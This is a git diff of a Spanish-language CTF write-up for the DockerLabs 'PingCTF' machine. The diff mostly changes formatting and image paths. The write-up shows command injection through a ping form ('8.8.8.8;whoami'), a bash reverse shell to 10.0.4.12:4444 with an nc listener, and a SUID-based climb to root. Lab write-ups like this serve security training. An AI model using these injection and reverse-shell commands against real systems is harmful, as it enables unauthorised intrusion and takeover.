@@ -1,22 +1,30 @@
-# 🖥️ Writeup - PingCTF 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# PingCTF ​​
+
+## 🖥️ Writeup - PingCTF
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `PHP` `Burp Suite` `Command Injection` `RCE` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip PingCTF.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh ping_ctf.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,22 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
+
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 19:38 CEST
 Nmap scan report for 172.17.0.2.
@@ -71,12 +81,12 @@ MAC Address: 02:42:AC:11:00:02 (Unknown)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
 ```
+
 El único puerto abierto es el puerto `80`, así que vamos a comprobar qué hay alojado.
 
 Encontramos una especie de portal donde podemos verificar la conectividad introduciendo `IPs` o dominios.
 
-
-![Portal de conectividad](../../images/IP%20verify.png)
+![Portal de conectividad](<../../.gitbook/assets/IP verify.png>)
 
 Haremos una prueba verificando la conectividad con Google introduciendo `8.8.8.8`.
 
@@ -84,7 +94,7 @@ Se nos redirige a una página de resultados en la que podemos ver que la URL es 
 
 ```
 http://172.17.0.2/ping.php?target=8.8.8.8
-``` 
+```
 
 Es decir, el archivo `ping.php` ejecuta un comando `ping` al target que le hemos pasado como parámetro.
 
@@ -94,8 +104,9 @@ Vamos a probar el clásico punto y coma después de la `IP`, seguido de un coman
 
 ```bash
 8.8.8.8;whoami
-``` 
-![whoami](../../images/whoami.png)
+```
+
+![whoami](../../.gitbook/assets/whoami.png)
 
 Como vemos, ha funcionado y estamos interactuando con el usuario `www-data`.
 
@@ -105,7 +116,8 @@ Una vez interceptada la petición, inyectamos el comando:
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.0.4.12/4444 0>&1'
-``` 
+```
+
 Luego seleccionamos el comando y pulsamos `Ctrl + U` para aplicar URL encoding.
 
 Colocamos un listener en el puerto `4444` de nuestra máquina atacante.
@@ -113,9 +125,11 @@ Colocamos un listener en el puerto `4444` de nuestra máquina atacante.
 ```bash
 nc -nlvp 4444
 ```
+
 Hacemos `forward` a la petición y recibimos la `reverse shell` en la máquina atacante.
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 56276
@@ -124,32 +138,37 @@ bash: no job control in this shell
 www-data@21a8aa7e4e6e:/var/www/html$
 ```
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
@@ -162,6 +181,7 @@ sudo getcap -r / 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/bin/umount
 /usr/bin/chsh
@@ -195,6 +215,7 @@ Finalmente, lo conseguimos con el comando:
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
